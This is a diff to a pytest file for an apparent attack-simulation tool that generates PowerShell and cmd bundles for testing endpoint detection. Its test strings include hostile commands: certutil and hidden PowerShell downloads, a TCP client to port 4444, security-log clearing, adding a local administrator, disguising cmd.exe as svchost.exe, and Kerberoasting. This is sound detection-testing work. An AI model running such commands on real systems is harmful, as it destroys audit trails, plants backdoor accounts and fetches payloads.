@@ -118,12 +118,83 @@ class TestDialectInference:
         ('cmd.exe /c "whoami & net user /domain"', "cmd"),
         ("for /L %i in (1,1,10) do @curl.exe -s http://h/ & timeout /t 3 >nul", "cmd"),
         ("certutil.exe -urlcache -split -f http://h/a.bin %TEMP%\\a.bin", "cmd"),
-        ('powershell.exe -w hidden -c "curl.exe http://h/a -o x"', "powershell"),
         ("Get-ChildItem $env:TEMP | Select-Object Name", "powershell"),
         ("avp.exe /c \"cmd.exe /e:ON /v:OFF /d /c whoami\"", "cmd"),
     ])
     def test_inference(self, cmd, expected):
         assert pg.infer_windows_shell(cmd) == expected
+
+    # ── CONT-13: structure, not a hand-picked verb list ──────────────────
+    @pytest.mark.parametrize("cmd", [
+        # the four regression shapes named by the finding
+        '$h="tu-node-a.cortexsim-tim.internal"; $c=[Net.Sockets.TcpClient]::new($h,443)',
+        "Use-STSRoleWithSAML -PrincipalArn $idp -RoleArn $role -SAMLAssertion $b64",
+        # verbs the old 28-verb list lacked
+        "Clear-History",
+        "Compress-Archive -Path x -DestinationPath y.zip",
+        "Rename-Item a b",
+        "Measure-Object",
+        "Expand-Archive x.zip",
+        "Format-List",
+        # other PowerShell structure with no cmdlet at all
+        "& /usr/bin/false",                       # statement-start call operator
+        "whoami /all; net user",                  # `;` separator (cmd has none)
+        "1..3 | % { $_ }",                        # range + alias block
+        "Rubeus.exe kerberoast  # comment",       # `#` comment (cmd has none)
+        "echo 'neutral marker'",                  # provably shell-neutral
+    ])
+    def test_structural_powershell(self, cmd):
+        assert pg.infer_windows_shell(cmd) == "powershell"
+
+    @pytest.mark.parametrize("cmd", [
+        "for /L %i in (1,1,3) do @echo %i",
+        "ipconfig /all & route print & arp -a",
+        "net user x /add && net localgroup administrators x /add",
+        "nltest.exe /dsgetdc:%USERDNSDOMAIN%",
+        "if exist C:\\x.txt del C:\\x.txt",
+        "set FOO=bar",
+        "tasklist | findstr /I \"cortex traps\"",
+    ])
+    def test_structural_cmd(self, cmd):
+        assert pg.infer_windows_shell(cmd) == "cmd"
+
+    def test_mixed_dialect_is_refused_not_sent_to_cmd(self):
+        """SIM-EDR-004 step-01 verbatim. Handed to cmd.exe (the old routing, since
+        `Clear-` was not in the verb list), Clear-History fails; handed to Windows
+        PowerShell 5.1, the infix `&` is a parse error and NOTHING runs."""
+        cmd = "wevtutil cl Security & wevtutil cl System & Clear-History"
+        assert pg.infer_windows_shell(cmd) == "mixed"
+        step = {"id": "step-01", "command": "echo x", "platform_variants": {"windows": cmd}}
+        res = pg.resolve_target(_scn([step]), "windows")
+        assert not res.emittable
+        assert res.unresolved == (("step-01", pg.REASON_MIXED_DIALECT),)
+        body = pg.BundleTargetUnsatisfiable("SIM-T", "windows", res.unresolved).to_error()
+        assert "MIXED_DIALECT" in body["detail"]
+        assert "ONE dialect" in body["detail"]
+
+    def test_bare_powershell_invocation_goes_through_cmd(self):
+        """`powershell.exe -Command "…"` is a native invocation. Under an OUTER
+        PowerShell, every `$x` inside those double quotes is interpolated to
+        empty before the inner interpreter sees it (`$c=New-Object …` becomes
+        `=New-Object …`); cmd.exe hands the string through literally and also
+        expands the %STAGE_HOST% an author put inside it (SIM-ASM-005 step-04).
+        It was classified powershell before this change."""
+        assert pg.infer_windows_shell('powershell.exe -w hidden -c "curl.exe http://h/a -o x"') == "cmd"
+        assert pg.infer_windows_shell(
+            'powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\'127.0.0.1\',4444)"'
+        ) == "cmd"
+        assert pg.infer_windows_shell(
+            'powershell.exe -NoProfile -Command "try { iwr http://%STAGE_HOST%/x } catch { }"'
+        ) == "cmd"
+
+    def test_mixed_cleanup_is_named_as_residue_not_run(self):
+        scn = _scn(
+            [{"id": "step-01", "command": "echo 'x'"}],
+            cleanup={"commands": ["del %TEMP%\\x & Remove-Item $env:TEMP\\y"]},
+        )
+        res = pg.resolve_target(scn, "windows")
+        assert res.cleanup == ()
+        assert res.skipped_cleanup == ("del %TEMP%\\x & Remove-Item $env:TEMP\\y",)
 
     def test_powershell_outranks_an_embedded_cmd_call(self):
         """SIM-EDR-017 step-03 shape: a PowerShell block that shells out to cmd.
@@ -139,6 +210,105 @@ class TestDialectInference:
         """`cmd /c foo.exe args` runs a bare exe invocation correctly;
         PowerShell's parser may not."""
         assert pg.infer_windows_shell("someTool.exe /flag value") == "cmd"
+
+
+# ─── PUSH-11: a `%` that a .cmd file and the command line read differently ──
+
+def _win_variant(cmd: str) -> dict:
+    return _scn([{"id": "step-01", "command": "echo 'x'", "platform_variants": {"windows": cmd}}])
+
+
+class TestCmdPercentContext:
+    """cmd text reaches cmd.exe two ways. The beacon always writes it to a
+    .cmd file; the push bundle does that for multi-line text and passes a
+    single line on the command line. cmd reads `%` differently in the two:
+
+        text                 .cmd file                   command line
+        for /L %i in …       "i was unexpected"          works
+        for /L %%i in …      works                       "%%i was unexpected"
+        a%20b, 1..3|%{…}     the lone % is dropped       kept
+        100%% done           one %                       two
+
+    So one authored text could run on push and fail on pull, or the reverse,
+    and the failure read as a missed detection. The resolver both paths share
+    now refuses such a step by name instead of emitting it.
+    """
+
+    @pytest.mark.parametrize("cmd", [
+        # the shape the routing test above used to pin as correct
+        "for /L %i in (1,1,3) do @curl.exe -s http://h/ & timeout /t 1 >nul",
+        "for /L %%i in (1,1,3) do @echo %%i",
+        "for %f in (*.txt) do type %f",
+        "for /F \"tokens=1\" %a in ('whoami') do echo %a",
+        "curl.exe -s http://h/a%20b -o %TEMP%\\a.bin",
+        "curl.exe -s \"http://h/?q=%41%42\"",
+        'powershell -nop -c "1..3|%{$_}"',
+        "echo 100%% done",
+        "whoami /all\nfor /L %i in (1,1,2) do @echo %i\n",
+        # batch parameters exist only in a file
+        "echo %~dp0 & echo %1",
+    ])
+    def test_context_dependent_percent_is_refused_by_name(self, cmd):
+        assert pg.infer_windows_shell(cmd) == "cmd"
+        assert pg.cmd_percent_is_context_dependent(cmd)
+        res = pg.resolve_target(_win_variant(cmd), "windows")
+        assert not res.emittable
+        assert res.unresolved == (("step-01", pg.REASON_CMD_PERCENT_CONTEXT),)
+        with pytest.raises(pg.BundleTargetUnsatisfiable) as exc:
+            pg.generate_powershell(_win_variant(cmd))
+        assert exc.value.unresolved == (("step-01", pg.REASON_CMD_PERCENT_CONTEXT),)
+
+    @pytest.mark.parametrize("cmd", [
+        "certutil.exe -urlcache -split -f http://h/a.bin %TEMP%\\a.bin",
+        "type C:\\Windows\\System32\\drivers\\etc\\hosts & nslookup %USERDNSDOMAIN%",
+        'copy /Y "%SystemRoot%\\System32\\cmd.exe" "%SystemRoot%\\Temp\\svchost.exe"\ndir "%SystemRoot%\\Temp\\svchost.exe"\n',
+        'powershell.exe -NoProfile -Command "try { iwr http://%STAGE_HOST%/x } catch { }"',
+        "if exist \"%ProgramFiles(x86)%\\x\" echo found",
+        "ipconfig /all & route print",
+        # substring / replace modifiers expand the same way in both contexts
+        "echo %COMPUTERNAME:~0,4% & echo %PATH:;= %",
+    ])
+    def test_a_paired_variable_reference_is_not_refused(self, cmd):
+        """`%NAME%` means the same thing in both contexts for a variable that
+        is defined, and that is every `%` the corpus' emitted cmd steps carry."""
+        assert not pg.cmd_percent_is_context_dependent(cmd)
+        res = pg.resolve_target(_win_variant(cmd), "windows")
+        assert res.emittable, res.unresolved
+        assert res.steps[0].shell == "cmd"
+
+    @pytest.mark.parametrize("cmd", [
+        "1..3 | % { $_ }",
+        "$x = 7 % 3; Write-Output $x",
+        "Get-ChildItem | % Name",
+        "Invoke-WebRequest -Uri 'http://h/a%20b' -UseBasicParsing",
+    ])
+    def test_a_percent_in_powershell_text_is_never_refused(self, cmd):
+        """`%` is an alias and an operator in PowerShell. Only cmd text is judged."""
+        res = pg.resolve_target(_win_variant(cmd), "windows")
+        assert res.emittable, res.unresolved
+        assert res.steps[0].shell == "powershell"
+
+    def test_the_refusal_says_how_to_fix_it(self):
+        unresolved = (("step-02", pg.REASON_CMD_PERCENT_CONTEXT),)
+        body = pg.BundleTargetUnsatisfiable("SIM-T", "windows", unresolved).to_error()
+        assert body["code"] == "BUNDLE_TARGET_UNSATISFIABLE"
+        assert "step-02 (CMD_PERCENT_CONTEXT)" in body["detail"]
+        assert "PowerShell" in body["detail"] and "%NAME%" in body["detail"]
+        # The step HAS a Windows command; "declare platform_variants.windows" would mislead.
+        assert "declare platform_variants.windows" not in body["detail"]
+
+    def test_a_context_dependent_cmd_cleanup_line_is_residue_not_run(self):
+        line = "for %f in (%TEMP%\\cortexsim-*) do del /q %f"
+        scn = _scn([{"id": "step-01", "command": "echo 'x'"}], cleanup={"commands": [line]})
+        res = pg.resolve_target(scn, "windows")
+        assert res.cleanup == ()
+        assert res.skipped_cleanup == (line,)
+
+    def test_a_windows_only_primary_is_judged_too(self):
+        step = {"id": "step-01", "platforms": ["windows"],
+                "command": "for /L %i in (1,1,3) do @ping -n 1 %COMPUTERNAME%"}
+        res = pg.resolve_target(_scn([step]), "windows")
+        assert res.unresolved == (("step-01", pg.REASON_CMD_PERCENT_CONTEXT),)
 
 
 # ─── resolve_target ──────────────────────────────────────────────────
@@ -278,11 +448,13 @@ class TestGeneratePowerShell:
         assert "curl -s http://127.0.0.1/update.bin -o /tmp/a.bin" not in out
 
     def test_routes_a_cmd_batch_variant_through_cmd_not_powershell(self):
-        """Pasting `for /L %i …` into a .ps1 yields a script that PARSES and
-        then fails at runtime — the same defect, mirrored."""
+        """Pasting cmd text into a .ps1 yields a script that PARSES and then
+        fails at runtime — the same defect, mirrored. (This test used to pin
+        `for /L %i …`, a shape that only ran in one of the two contexts cmd
+        text reaches; see TestCmdPercentContext.)"""
         scn = _scn([{
             "id": "step-01", "command": "echo 'x'",
-            "platform_variants": {"windows": "for /L %i in (1,1,3) do @curl.exe -s http://h/ & timeout /t 1 >nul"},
+            "platform_variants": {"windows": "ping -n 3 127.0.0.1 >nul & curl.exe -s http://h/ -o %TEMP%\\a.bin"},
         }])
         out = pg.generate_powershell(scn)
         assert "-Shell 'cmd'" in out
@@ -294,23 +466,93 @@ class TestGeneratePowerShell:
         scn = _scn([{"id": "step-01", "command": "echo 'marker — with em dash'"}])
         assert pg.generate_powershell(scn).startswith("\ufeff")
 
-    def test_here_string_falls_back_when_the_payload_would_terminate_it(self):
-        """A command line starting with `'@` closes a literal here-string early
-        and produces a syntactically broken bundle."""
-        scn = _scn([{
-            "id": "step-01", "platforms": ["windows"],
-            "command": "Write-Output 'a'\n'@ this line would close a here-string\nWrite-Output 'b'",
-        }])
-        out = pg.generate_powershell(scn)
-        # Fallback form: single-quoted string with doubled quotes, no here-string.
-        assert "$CsCmd_step_01 = @'" not in out
-        assert "''@ this line would close a here-string" in out
+    @pytest.mark.parametrize("terminator", ["'@", "\u2018@", "\u2019@", "\u201a@", "\u201b@"])
+    def test_here_string_falls_back_when_the_payload_would_terminate_it(self, terminator):
+        """A line starting with ANY single-quote-class character followed by `@`
+        closes a literal here-string early — PowerShell treats U+2018..U+201B as
+        single quotes, so a pasted `’@` forges the terminator exactly as `'@`
+        does. The fallback is a single-quoted literal with every quote doubled."""
+        lit = pg._ps_literal(f"Write-Output 'a'\n{terminator} closes it\nWrite-Output 'b'")
+        assert not lit.startswith("@'"), "a forgeable here-string terminator was not detected"
+        assert lit.startswith("'") and lit.endswith("'")
+        assert f"{terminator[0]}{terminator[0]}@ closes it" in lit
+
+    def test_here_string_kept_when_no_line_can_terminate_it(self):
+        assert pg._ps_literal("Write-Output 'a'\n x '@ mid-line is fine").startswith("@'\n")
+
+    @pytest.mark.parametrize("quote", ["'", "\u2018", "\u2019", "\u201a", "\u201b"])
+    def test_single_quoted_literals_double_every_quote_class_character(self, quote):
+        assert pg._ps_sq(f"don{quote}t") == f"'don{quote}{quote}t'"
+        assert pg._ps_inline(f"don{quote}t") == f"'don{quote}{quote}t'"
+
+    def test_step_text_never_appears_as_code(self):
+        """Step bodies travel base64-encoded and are decoded at run time, so no
+        quoting layer surrounds author text — and the readable copy is a comment."""
+        import base64  # noqa: PLC0415
+
+        body = "Write-Output 'a'\n'@\nWrite-Output 'b'"
+        out = pg.generate_powershell(_scn([{"id": "step-01", "platforms": ["windows"], "command": body}]))
+        literal = out.split("$CsCmd_01 = '", 1)[1].split("'", 1)[0]
+        assert base64.b64decode(literal).decode("utf-8") == body
+        for line in body.split("\n"):
+            assert f"#   | {line}\n" in out
 
     def test_identity_degradation_is_surfaced_per_step(self):
         scn = _scn([{"id": "step-01", "identity": "www-data", "command": "echo 'x'"}])
         out = pg.generate_powershell(scn)
         assert "cortexsim-identity-degraded" in out
         assert "-Identity 'www-data'" in out
+
+    def test_degraded_identities_are_listed_in_the_header_before_anything_runs(self):
+        """A DC reading the .ps1 learns which steps cannot reach their declared
+        identity, and that the exit code will not say so."""
+        scn = _scn([
+            {"id": "step-01", "identity": "www-data", "command": "echo 'x'"},
+            {"id": "step-02", "identity": "root", "command": "echo 'x'"},
+            {"id": "step-03", "identity": "direct", "command": "echo 'x'"},
+            {"id": "step-04", "command": "echo 'x'"},
+            {"id": "step-05", "identity": "Administrator", "command": "echo 'x'"},
+            {"id": "step-06", "identity": "svc-backup", "command": "echo 'x'"},
+        ])
+        out = pg.generate_powershell(scn)
+        header = out.split("$ErrorActionPreference", 1)[0]
+        block = header.split("# Identity DEGRADED", 1)[1].split("# RESIDUE", 1)[0]
+        listed = [ln.strip("# \n") for ln in block.splitlines() if ln.startswith("#     ")]
+        assert listed == ["step-01 (identity www-data)", "step-06 (identity svc-backup)"]
+        assert "does not change the exit code" in " ".join(header.replace("#", " ").split())
+        assert "IDENTITY column" in header
+        assert "$CortexSimDegradedSteps = @('step-01 (www-data)', 'step-06 (svc-backup)')" in out
+
+    def test_a_bundle_with_no_degraded_identity_says_none(self):
+        scn = _scn([{"id": "step-01", "identity": "root", "command": "echo 'x'"},
+                    {"id": "step-02", "command": "echo 'x'"}])
+        out = pg.generate_powershell(scn)
+        header = out.split("$ErrorActionPreference", 1)[0]
+        block = header.split("# Identity DEGRADED", 1)[1].split("# RESIDUE", 1)[0]
+        assert "#     (none)\n" in block
+        assert "$CortexSimDegradedSteps = @()" in out
+
+    def test_the_header_and_the_harness_classify_identity_the_same_way(self):
+        """The header list is computed in Python, the run-time mode in
+        PowerShell (Resolve-CsIdentity). Both must read the same allowlist, or
+        the header promises one thing and the table shows another."""
+        from engine.identity_spec import direct_identities  # noqa: PLC0415
+
+        ids = ["", "direct", "DIRECT", "root", "Root", "container-runtime", "administrator",
+               "SYSTEM", "www-data", "user", "svc-backup", "postgres"]
+        scn = _scn([{"id": f"step-{i:02d}", "identity": ident, "command": "echo 'x'"}
+                    for i, ident in enumerate(ids, start=1)])
+        out = pg.generate_powershell(scn)
+        elevated = ({d.lower() for d in direct_identities()} | {"administrator", "system"}) - {"direct"}
+        want = [
+            f"step-{i:02d} ({ident})" for i, ident in enumerate(ids, start=1)
+            if ident.strip() and ident.lower() != "direct" and ident.lower() not in elevated
+        ]
+        assert want == ["step-09 (www-data)", "step-10 (user)", "step-11 (svc-backup)", "step-12 (postgres)"]
+        literal = "@(" + ", ".join("'" + w + "'" for w in want) + ")"
+        assert f"$CortexSimDegradedSteps = {literal}" in out
+        # ...and the PowerShell side still branches on exactly those names.
+        assert "$CortexSimDirectIdentities -contains $lower -or $lower -eq 'administrator' -or $lower -eq 'system'" in out
 
     def test_direct_identity_allowlist_comes_from_the_canonical_spec(self):
         """Push-bash, push-PowerShell and the Go beacon must not grow three
@@ -347,11 +589,70 @@ class TestGeneratePowerShell:
         # mutating machine policy is not.
         assert "-ExecutionPolicy Bypass -File" in code
 
+    def test_a_variant_steps_technique_is_marked_as_the_primarys(self):
+        """CONT-17. A step has ONE mitre_technique, authored for its primary
+        command. SIM-EDR-003 step-01 printed `# MITRE: T1053.003` (Cron) above a
+        schtasks.exe command, which is T1053.005. The schema cannot carry a
+        per-variant technique yet, so the bundle says whose technique it is
+        rather than presenting it as the Windows command's."""
+        scn = _scn([
+            {"id": "step-01", "mitre_technique": "T1053.003", "command": "crontab -l",
+             "platform_variants": {"windows": "schtasks.exe /query /fo LIST"}},
+            {"id": "step-02", "mitre_technique": "T1059.001", "platforms": ["windows"],
+             "command": "Get-Process -Name lsass"},
+            {"id": "step-03", "mitre_technique": "T1082", "command": "echo 'neutral'"},
+        ])
+        out = pg.generate_powershell(scn)
+        assert ("# MITRE: T1053.003 (authored for the primary command; "
+                "this step runs its windows variant)\n") in out
+        # A windows-native primary and a shell-neutral command ARE the authored text.
+        assert "# MITRE: T1059.001\n" in out
+        assert "# MITRE: T1082\n" in out
+
+    def test_run_instructions_name_what_can_stop_the_bundle_on_a_managed_host(self):
+        """PUSH-16. The header said `-ExecutionPolicy Bypass` and `Unblock-File`
+        and nothing else, so on a host where Group Policy sets AllSigned every
+        PowerShell step failed "not digitally signed" and read as a failed TTP."""
+        scn = _scn([{"id": "step-01", "identity": "root", "command": "echo 'x'"}])
+        header = pg.generate_powershell(scn).split("$ErrorActionPreference", 1)[0]
+        flat = " ".join(header.replace("#", " ").split())
+        # Group Policy precedence, and how to see it.
+        assert "Get-ExecutionPolicy -List" in flat
+        assert "MachinePolicy" in flat and "UserPolicy" in flat
+        assert "outranks -ExecutionPolicy Bypass" in flat
+        assert "not signed" in flat
+        # Every step is its own child script, so policy applies to each one.
+        assert "every PowerShell step" in flat
+        # What a policy refusal looks like in the outcome table.
+        assert "policy refusal, not a detection result" in flat
+        # AMSI / the endpoint agent scan the file as a whole.
+        assert "AMSI" in flat and "as a whole" in flat
+        # Elevation is still stated when a step needs it.
+        assert "from an ELEVATED prompt" in flat
+        # ...and the bundle still never mutates policy itself.
+        code = "\n".join(ln for ln in pg.generate_powershell(scn).split("\n")
+                         if not ln.lstrip().startswith("#"))
+        assert "Set-ExecutionPolicy" not in code
+
+    def test_the_harness_warns_when_group_policy_will_refuse_the_steps(self):
+        """The header can be skipped; the log cannot. At start of run the
+        harness reads Get-ExecutionPolicy -List and names the conflict. It
+        warns, it does not refuse: exit codes are unchanged."""
+        scn = _scn([{"id": "step-01", "command": "echo 'x'"}])
+        out = pg.generate_powershell(scn)
+        code = "\n".join(ln for ln in out.split("\n") if not ln.lstrip().startswith("#"))
+        assert "function Get-CsPolicyConflict" in code
+        assert "Get-ExecutionPolicy -List" in code
+        assert "cortexsim-policy-warning reason=EXECUTION_POLICY_GPO" in code
+        # Read-only: the probe is inside a try and never gates a step.
+        assert "exit" not in code.split("function Get-CsPolicyConflict", 1)[1].split("function ", 1)[0]
+
     def test_no_ps7_only_operators_in_generated_code(self):
         """Server 2016/2019/2022 and Win10/11 ship Windows PowerShell 5.1."""
         scn = _scn([{"id": "step-01", "command": "echo 'x'"}])
         # Generated CODE only — payload literals may legitimately contain `&&`.
-        code = pg.generate_powershell(scn).split("$CsCmd_step_01")[0]
+        # (tests/engine/test_push_ps_execution.py proves the same by AST walk.)
+        code = pg.generate_powershell(scn).split("$CsCmd_01")[0]
         for op in ("&&", "||", "??"):
             assert op not in code
 
@@ -399,32 +700,54 @@ class TestBashUnchanged:
         assert pg.generate_bash(scn).splitlines()[0].startswith("#!")
 
 
-def test_step_script_forces_terminating_errors():
-    """A failing PowerShell step must not log "completed successfully".
+def _powershell_or_skip() -> str:
+    import os  # noqa: PLC0415
+    import shutil  # noqa: PLC0415
+    import sys  # noqa: PLC0415
 
-    PowerShell's default ErrorActionPreference is 'Continue': a cmdlet that
-    fails non-terminatingly writes to stderr and the process still exits 0. Each
-    step runs as its own `pwsh -File`, so without an explicit preference the
-    step body inherits that default and Invoke-CsStep's $LASTEXITCODE check sees
-    zero — reporting a step that did nothing as a success.
+    exe = (shutil.which("powershell.exe") if sys.platform == "win32" else None) or shutil.which("pwsh")
+    if exe is None:
+        if os.environ.get("CORTEXSIM_REQUIRE_POWERSHELL") == "1" or os.environ.get("CI"):
+            pytest.fail("PowerShell is required here (CI or CORTEXSIM_REQUIRE_POWERSHELL=1)")
+        pytest.skip("no PowerShell interpreter on PATH")
+    return exe
 
-    That is a manufactured false green, and it is the worst shape this bundle
-    can take: the DC reads "the TTP ran" and concludes Cortex missed it, when in
-    fact no attack telemetry was ever emitted. This is the PowerShell analogue
-    of the bash bundle's `set -euo pipefail`.
+
+def test_a_failing_step_is_reported_as_failed_when_executed(tmp_path):
+    """A failing PowerShell step must not log "completed successfully" — proven
+    by RUNNING the bundle, not by grepping it.
+
+    This replaces ``test_step_script_forces_terminating_errors``, which asserted
+    only that the substring ``$ErrorActionPreference = 'Stop'`` appeared in the
+    bundle. It did — inside a DOUBLE-quoted string, so the harness's own value
+    expanded in and every step file began ``Continue = 'Stop'``: the
+    ``continue`` keyword, which ended the step with exit 0 before its TTP line
+    ran. The substring test passed with every PowerShell step a no-op. The full
+    execution guard is tests/engine/test_push_ps_execution.py.
     """
+    import os  # noqa: PLC0415
+    import subprocess  # noqa: PLC0415
+    import sys  # noqa: PLC0415
+
+    exe = _powershell_or_skip()
     scn = _scn([{
         "id": "step-01",
         "command": "echo posix",
         "platforms": ["windows"],
-        "platform_variants": {"windows": "Get-Process -Name nosuchprocess"},
+        "platform_variants": {"windows": "Get-Process -Name cortexsim-nosuchprocess-xyz"},
     }])
-    bundle = pg.generate_powershell(scn)
-
-    assert "$ErrorActionPreference = 'Stop'" in bundle, (
-        "the per-step script must force terminating errors, or a failing step "
-        "exits 0 and is logged as a success"
+    path = tmp_path / "b.ps1"
+    path.write_text(pg.generate_powershell(scn), encoding="utf-8")
+    env = {k: v for k, v in os.environ.items() if not k.startswith("CORTEXSIM_")}
+    env.update({"TEMP": str(tmp_path), "TMP": str(tmp_path)})
+    args = [exe, "-NoProfile", "-NonInteractive"]
+    if sys.platform == "win32":
+        args += ["-ExecutionPolicy", "Bypass"]
+    proc = subprocess.run(
+        args + ["-File", str(path)], env=env, capture_output=True, text=True,
+        timeout=120, encoding="utf-8", errors="replace", cwd=str(tmp_path),
     )
-    # It must be written INTO the step body, not merely set in the harness —
-    # the step is a separate process and does not inherit the harness setting.
-    assert "$stepBody" in bundle
+    out = proc.stdout + proc.stderr
+    assert "Step step-01 completed successfully" not in out, out
+    assert "cortexsim-step-result step=step-01 outcome=ran-nonzero exit=1" in out, out
+    assert proc.returncode == 1, out
